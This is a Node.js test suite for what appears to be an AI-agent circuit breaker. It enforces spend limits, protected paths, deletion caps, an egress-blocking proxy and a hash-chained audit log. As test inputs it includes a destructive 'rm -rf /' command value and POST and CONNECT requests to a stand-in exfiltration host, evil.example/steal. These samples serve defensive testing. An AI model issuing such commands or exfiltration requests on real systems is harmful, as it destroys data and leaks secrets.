import { test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { mkdtempSync, writeFileSync, mkdirSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Breaker } from "../src/breaker.js";
import { normalizePolicy, globToRegExp, hostMatches } from "../src/policy.js";
import { UsageParser, createProxy } from "../src/proxy.js";
import { snapshot, diff } from "../src/fswatch.js";
import { AuditLog, verifyChain } from "../src/audit.js";
import { run } from "../src/run.js";

const clock = (t0 = 1_000_000) => { let t = t0; const f = () => t; f.adv = (ms) => (t += ms); return f; };
const P = (o) => normalizePolicy(o);

test("policy rejects unknown keys, bad limits, bad notify", () => {
  assert.throws(() => P({ lmits: {} }), /unknown policy key/);
  assert.throws(() => P({ limits: { max_usd: -1 } }), /positive/);
  assert.throws(() => P({ limits: { max_usd: "5" } }), /positive/);
  assert.throws(() => P({ limits: { max_usd: NaN } }), /positive/);
  assert.throws(() => P({ limits: { bogus: 1 } }), /unknown limit/);
  assert.throws(() => P({ notify_command: "rm -rf /" }), /array/);
  assert.throws(() => P({ on_trip: "ignore" }), /on_trip/);
  assert.throws(() => P([]), /object/);
});

test("globs: protected paths match at any depth, ** crosses dirs, * does not", () => {
  assert.ok(globToRegExp(".env").test("app/.env"));
  assert.ok(globToRegExp(".env.*").test(".env.local"));
  assert.ok(!globToRegExp(".env").test("my.env"));
  assert.ok(globToRegExp(".ssh/**").test(".ssh/keys/id_rsa"));
  assert.ok(!globToRegExp("*.js").test("a/b.js") === false); // matches b.js at any depth
  assert.ok(!globToRegExp("a/*.js").test("a/b/c.js"));
  assert.ok(globToRegExp("a+b(1).txt").test("a+b(1).txt")); // regex metachars are literal
});

test("hostMatches: wildcard needs a real subdomain, case-insensitive, trailing dot", () => {
  assert.ok(hostMatches("API.Github.com.", ["*.github.com"]));
  assert.ok(!hostMatches("github.com", ["*.github.com"]));
  assert.ok(!hostMatches("evilgithub.com", ["*.github.com"]));
  assert.ok(!hostMatches("github.com.evil.io", ["github.com"]));
});

test("spend cap trips once, and not before", () => {
  const b = new Breaker(P({ limits: { max_usd: 1 }, prices: [{ match: "m", input_per_mtok: 1_000_000, output_per_mtok: 0 }] }));
  let trips = 0; b.on("trip", () => trips++);
  b.addUsage({ model: "m1", input: 1 });
  assert.equal(trips, 0);
  b.addUsage({ model: "m1", input: 1 });
  b.addUsage({ model: "m1", input: 5 });
  assert.equal(trips, 1);
  assert.equal(b.lastTrip.reason, "spend limit reached");
});

test("unpriced model is reported, never silently free", () => {
  const b = new Breaker(P({ limits: { max_usd: 1 } }));
  b.addUsage({ model: "mystery", input: 1e9, output: 1e9 });
  assert.deepEqual(b.stats().unpriced_models, ["mystery"]);
  assert.equal(b.state, "ok");
});

test("hourly spend slides; request loop detection slides", () => {
  const c = clock();
  const b = new Breaker(P({ limits: { max_usd_per_hour: 1, max_requests_per_minute: 3 }, prices: [{ match: "", input_per_mtok: 1e6, output_per_mtok: 0 }] }), c);
  b.addUsage({ model: "x", input: 1 }); c.adv(3_700_000);
  b.addUsage({ model: "x", input: 1 });
  assert.equal(b.state, "ok");
  for (let i = 0; i < 3; i++) { b.addRequest(); c.adv(30_000); }
  assert.equal(b.state, "ok");   // 3 requests over 90s, window holds at most 2
  for (let i = 0; i < 4; i++) b.addRequest();
  assert.equal(b.state, "tripped");
});

test("garbage usage values never produce NaN or negative cost", () => {
  const b = new Breaker(P({ limits: { max_usd: 1 }, prices: [{ match: "", input_per_mtok: 1, output_per_mtok: 1 }] }));
  b.addUsage({ model: "x", input: "abc", output: -5 });
  b.addUsage({ model: null, input: undefined });
  assert.ok(Number.isFinite(b.usd) && b.usd >= 0);
});

test("protected paths trip immediately; ignored paths do not count", () => {
  const b = new Breaker(P({}));
  b.addFsEvent("write", "node_modules/x/y.js");
  b.addFsEvent("delete", ".git/objects/ab/cd");
  assert.equal(b.state, "ok");
  b.addFsEvent("write", "sub/.env");
  assert.equal(b.state, "tripped");
  assert.match(b.lastTrip.reason, /protected path modified/);
});

test("mass deletion trips", () => {
  const b = new Breaker(P({ limits: { max_deletes_per_minute: 5 } }));
  for (let i = 0; i < 5; i++) b.addFsEvent("delete", `f${i}`);
  assert.equal(b.state, "ok");
  b.addFsEvent("delete", "f5");
  assert.equal(b.state, "tripped");
});

test("upload cap and repeated blocked attempts trip", () => {
  const b = new Breaker(P({ limits: { max_upload_mb: 1, max_blocked_attempts: 2 } }));
  b.addBlocked("a.io"); assert.equal(b.state, "ok");
  b.addBlocked("b.io"); assert.equal(b.state, "tripped");
  const b2 = new Breaker(P({ limits: { max_upload_mb: 1 } }));
  b2.addUpload("x", 2 * 1048576);
  assert.equal(b2.state, "tripped");
});

test("runtime limit; resume raises cumulative limits so it does not instantly re-trip", () => {
  const c = clock();
  const b = new Breaker(P({ limits: { max_usd: 1, max_runtime_minutes: 10 }, prices: [{ match: "", input_per_mtok: 1e6, output_per_mtok: 0 }] }), c);
  b.addUsage({ model: "x", input: 2 });
  assert.equal(b.state, "tripped");
  b.resume();
  assert.equal(b.state, "ok");
  b.addUsage({ model: "x", input: 0.5 });
  assert.equal(b.state, "ok");
  b.addUsage({ model: "x", input: 1 });
  assert.equal(b.state, "tripped");
  b.resume(); c.adv(11 * 60_000); b.tick();
  assert.equal(b.state, "tripped");
  assert.equal(b.lastTrip.reason, "runtime limit reached");
});

test("UsageParser: json, anthropic sse, openai shape, junk, oversized", () => {
  let p = new UsageParser(); p.push('{"model":"m","usage":{"input_tokens":10,"output_tokens":4,"cache_read_input_tokens":6}}');
  assert.deepEqual(p.finish("application/json"), { model: "m", input: 16, output: 4 });
  p = new UsageParser();
  p.push('event: message_start\ndata: {"type":"message_start","message":{"model":"c","usage":{"input_tokens":25,"output_tokens":1}}}\n\ndata: {"type":"message_delta","usage":{"output_tokens":90}}\n\ndata: [DONE]\n');
  assert.deepEqual(p.finish("text/event-stream; charset=utf-8"), { model: "c", input: 25, output: 90 });
  p = new UsageParser(); p.push('{"model":"g","usage":{"prompt_tokens":3,"completion_tokens":2}}');
  assert.deepEqual(p.finish(""), { model: "g", input: 3, output: 2 });
  p = new UsageParser(); p.push("<html>nope</html>");
  assert.deepEqual(p.finish("text/html"), { model: null, input: 0, output: 0 });
  p = new UsageParser(); p.push('{"usage":{"input_tokens":"lots"}}'); assert.equal(p.finish("").input, 0);
  p = new UsageParser(); for (let i = 0; i < 20; i++) p.push("x".repeat(1024 * 1024)); assert.ok(p.buf.length <= 5 * 1024 * 1024);
});

test("snapshot/diff sees writes, deletes, and ignores configured dirs", () => {
  const d = mkdtempSync(join(tmpdir(), "ab-"));
  mkdirSync(join(d, "sub")); mkdirSync(join(d, "node_modules"));
  writeFileSync(join(d, "a.txt"), "1"); writeFileSync(join(d, "sub/b.txt"), "1"); writeFileSync(join(d, "node_modules/z"), "1");
  const ign = (r) => r.startsWith("node_modules");
  const s1 = snapshot(d, ign);
  assert.deepEqual([...s1.keys()].sort(), ["a.txt", "sub/b.txt"]);
  rmSync(join(d, "sub/b.txt")); writeFileSync(join(d, "a.txt"), "22"); writeFileSync(join(d, "new"), "x");
  const r = diff(s1, snapshot(d, ign));
  assert.deepEqual(r.deletes, ["sub/b.txt"]);
  assert.deepEqual(r.writes.sort(), ["a.txt", "new"]);
  rmSync(d, { recursive: true });
});

test("audit chain detects edits, deletions, reordering", () => {
  const d = mkdtempSync(join(tmpdir(), "ab-")); const f = join(d, "a.jsonl");
  const a = new AuditLog(f); a.write("one"); a.write("two", { x: 1 }); a.write("three"); a.close();
  const txt = readFileSync(f, "utf8");
  assert.deepEqual(verifyChain(txt), { ok: true, lines: 3 });
  const lines = txt.trim().split("\n");
  assert.equal(verifyChain(lines.join("\n").replace('"x":1', '"x":2')).ok, false);
  assert.equal(verifyChain([lines[0], lines[2]].join("\n")).ok, false);
  assert.equal(verifyChain([lines[1], lines[0], lines[2]].join("\n")).ok, false);
  assert.equal(verifyChain("not json").ok, false);
  rmSync(d, { recursive: true });
});

// ---- integration: real proxy, real fake upstream, real child processes ----
function fakeUpstream(body, type = "application/json") {
  return new Promise((r) => {
    const s = http.createServer((req, res) => { req.resume(); req.on("end", () => { res.writeHead(200, { "content-type": type }); res.end(body); }); });
    s.listen(0, "127.0.0.1", () => r(s));
  });
}
const httpReq = (port, path, opts = {}) => new Promise((res, rej) => {
  const r = http.request({ port, host: "127.0.0.1", path, method: opts.method ?? "POST" }, (x) => { let b = ""; x.on("data", (c) => (b += c)); x.on("end", () => res({ status: x.statusCode, body: b })); });
  r.on("error", rej); r.end(opts.body ?? "{}");
});

test("proxy: counts tokens from upstream, trips on spend, then refuses further requests", async () => {
  const up = await fakeUpstream(JSON.stringify({ model: "m", usage: { input_tokens: 1_000_000, output_tokens: 0 } }));
  const policy = P({ upstreams: { anthropic: `http://127.0.0.1:${up.address().port}` }, limits: { max_usd: 1 }, prices: [{ match: "m", input_per_mtok: 1, output_per_mtok: 0 }] });
  const b = new Breaker(policy); const events = [];
  const px = createProxy({ policy, breaker: b, audit: (e) => events.push(e) });
  await new Promise((r) => px.listen(0, "127.0.0.1", r)); const port = px.address().port;
  let r = await httpReq(port, "/anthropic/v1/messages"); assert.equal(r.status, 200);
  assert.equal(b.usd, 1); assert.equal(b.state, "ok");
  await httpReq(port, "/anthropic/v1/messages");
  assert.equal(b.state, "tripped");
  r = await httpReq(port, "/anthropic/v1/messages"); assert.equal(r.status, 503);
  assert.equal((await httpReq(port, "/nope/x")).status, 503); // frozen takes precedence
  px.closeAllConnections(); px.close(); up.close();
});

test("proxy: unknown upstream names, including __proto__, are 404", async () => {
  const policy = P({}); const b = new Breaker(policy);
  const px = createProxy({ policy, breaker: b, audit: () => {} });
  await new Promise((r) => px.listen(0, "127.0.0.1", r)); const port = px.address().port;
  for (const n of ["nope", "__proto__", "constructor", "toString"]) assert.equal((await httpReq(port, `/${n}/x`)).status, 404, n);
  px.closeAllConnections(); px.close();
});

test("proxy: egress allowlist blocks forward and CONNECT, and repeated attempts trip", async () => {
  const policy = P({ limits: { max_blocked_attempts: 3 } }); const b = new Breaker(policy);
  const px = createProxy({ policy, breaker: b, audit: () => {} });
  await new Promise((r) => px.listen(0, "127.0.0.1", r)); const port = px.address().port;
  const r = await new Promise((res) => { const q = http.request({ port, host: "127.0.0.1", path: "http://evil.example/steal", method: "POST" }, (x) => { x.resume(); res(x.statusCode); }); q.end("data"); });
  assert.equal(r, 403);
  const c = await new Promise((res) => { const q = http.request({ port, host: "127.0.0.1", method: "CONNECT", path: "evil.example:443" }); q.on("connect", (x) => res(x.statusCode)); q.end(); });
  assert.equal(c, 403);
  const bad = await new Promise((res) => { const q = http.request({ port, host: "127.0.0.1", method: "CONNECT", path: "no-port" }); q.on("connect", (x) => res(x.statusCode)); q.end(); });
  assert.equal(bad, 400);
  assert.equal(b.blocked, 2);
  await new Promise((res) => { const q = http.request({ port, host: "127.0.0.1", method: "CONNECT", path: "evil2.example:443" }); q.on("connect", () => res()); q.end(); });
  assert.equal(b.state, "tripped");
  px.closeAllConnections(); px.close();
});

test("proxy: log mode allows but still records", async () => {
  const sink = await fakeUpstream("ok", "text/plain");
  const policy = P({ egress: { mode: "log" } }); const b = new Breaker(policy); const ev = [];
  const px = createProxy({ policy, breaker: b, audit: (e, d) => ev.push([e, d.host]) });
  await new Promise((r) => px.listen(0, "127.0.0.1", r)); const port = px.address().port;
  const status = await new Promise((res) => { const q = http.request({ port, host: "127.0.0.1", path: `http://127.0.0.1:${sink.address().port}/`, method: "GET" }, (x) => { x.resume(); res(x.statusCode); }); q.end(); });
  assert.equal(status, 200); assert.equal(ev[0][0], "egress");
  px.closeAllConnections(); px.close(); sink.close();
});

function sandbox(extra = {}) {
  const d = mkdtempSync(join(tmpdir(), "abrun-"));
  return { d, policy: P({ workspace: d, ...extra }) };
}
const NODE = process.execPath;

test("run: clean child exits with its own code and audit log verifies", async () => {
  const { d, policy } = sandbox();
  const code = await run({ policy, argv: [NODE, "-e", "process.exit(7)"], ask: async () => "kill", out: () => {} });
  assert.equal(code, 7);
  assert.equal(verifyChain(readFileSync(join(d, ".agentbreaker/audit.jsonl"), "utf8")).ok, true);
  rmSync(d, { recursive: true, force: true });
});

test("run: agent touching .env is paused, and killed when the human says kill", async () => {
  const { d, policy } = sandbox();
  const script = `require('fs').writeFileSync('.env','SECRET=1'); setTimeout(()=>{},60000)`;
  let asked = 0;
  const code = await run({ policy, argv: [NODE, "-e", script], pollMs: 50, ask: async (t) => { asked++; assert.match(t.reason, /\.env/); return "kill"; }, out: () => {} });
  assert.equal(asked, 1);
  assert.equal(code, 137);
  const log = readFileSync(join(d, ".agentbreaker/audit.jsonl"), "utf8");
  assert.match(log, /"event":"paused"/); assert.match(log, /"event":"kill"/);
  rmSync(d, { recursive: true, force: true });
});

test("run: pause then resume lets the agent finish", async () => {
  const { d, policy } = sandbox({ pause_timeout_s: 30 });
  const script = `require('fs').writeFileSync('.env','x'); setTimeout(()=>{require('fs').writeFileSync('done','1')},600)`;
  const code = await run({ policy, argv: [NODE, "-e", script], pollMs: 50, ask: async () => "resume", out: () => {} });
  assert.equal(code, 0);
  assert.equal(readFileSync(join(d, "done"), "utf8"), "1");
  rmSync(d, { recursive: true, force: true });
});

test("run: on_trip=kill needs no human; no decision within timeout kills", async () => {
  let r = sandbox({ on_trip: "kill" });
  let code = await run({ policy: r.policy, argv: [NODE, "-e", `require('fs').writeFileSync('.env','x');setTimeout(()=>{},60000)`], pollMs: 50, ask: async () => { throw new Error("must not ask"); }, out: () => {} });
  assert.equal(code, 137); rmSync(r.d, { recursive: true, force: true });
  r = sandbox({ pause_timeout_s: 0.3 });
  code = await run({ policy: r.policy, argv: [NODE, "-e", `require('fs').writeFileSync('.env','x');setTimeout(()=>{},60000)`], pollMs: 50, ask: () => new Promise(() => {}), out: () => {} });
  assert.equal(code, 137); rmSync(r.d, { recursive: true, force: true });
});

test("run: SIGSTOP really freezes the agent (no writes while paused)", async () => {
  const { d, policy } = sandbox({ pause_timeout_s: 30 });
  const script = `const fs=require('fs');fs.writeFileSync('.env','x');let i=0;setInterval(()=>fs.writeFileSync('tick',String(i++)),20)`;
  let before;
  const code = await run({ policy, argv: [NODE, "-e", script], pollMs: 50, ask: async () => {
    await new Promise((r) => setTimeout(r, 150)); before = readFileSync(join(d, "tick"), "utf8");
    await new Promise((r) => setTimeout(r, 400));
    assert.equal(readFileSync(join(d, "tick"), "utf8"), before);
    return "kill";
  }, out: () => {} });
  assert.equal(code, 137);
  rmSync(d, { recursive: true, force: true });
});

test("run: grandchildren die with the agent (process group kill)", async () => {
  const { d, policy } = sandbox({ on_trip: "kill" });
  const script = `const cp=require('child_process');const c=cp.spawn(process.execPath,['-e','setTimeout(()=>{},60000)'],{stdio:'ignore'});require('fs').writeFileSync('gc',String(c.pid));require('fs').writeFileSync('.env','x');setTimeout(()=>{},60000)`;
  await run({ policy, argv: [NODE, "-e", script], pollMs: 50, ask: async () => "kill", out: () => {} });
  const pid = Number(readFileSync(join(d, "gc"), "utf8"));
  await new Promise((r) => setTimeout(r, 200));
  assert.throws(() => process.kill(pid, 0), /ESRCH/);
  rmSync(d, { recursive: true, force: true });
});

test("run: child gets proxy env; blocked egress through the real proxy trips", async () => {
  const { d, policy } = sandbox({ on_trip: "kill", limits: { max_blocked_attempts: 2 } });
  const script = `const http=require('http');const p=new URL(process.env.HTTP_PROXY);
  const hit=()=>new Promise(r=>{const q=http.request({host:p.hostname,port:p.port,path:'http://evil.example/',method:'POST'},x=>{x.resume();r()});q.on('error',r);q.end('d')});
  (async()=>{await hit();await hit();setTimeout(()=>{},60000)})()`;
  const code = await run({ policy, argv: [NODE, "-e", script], ask: async () => "kill", out: () => {} });
  assert.equal(code, 137);
  assert.match(readFileSync(join(d, ".agentbreaker/audit.jsonl"), "utf8"), /egress_blocked/);
  rmSync(d, { recursive: true, force: true });
});

test("run: missing command fails cleanly instead of hanging", async () => {
  const { d, policy } = sandbox();
  const code = await Promise.race([run({ policy, argv: ["/nonexistent/agent-xyz"], ask: async () => "kill", out: () => {} }), new Promise((r) => setTimeout(() => r("HUNG"), 5000))]);
  assert.notEqual(code, "HUNG"); assert.notEqual(code, 0);
  rmSync(d, { recursive: true, force: true });
});
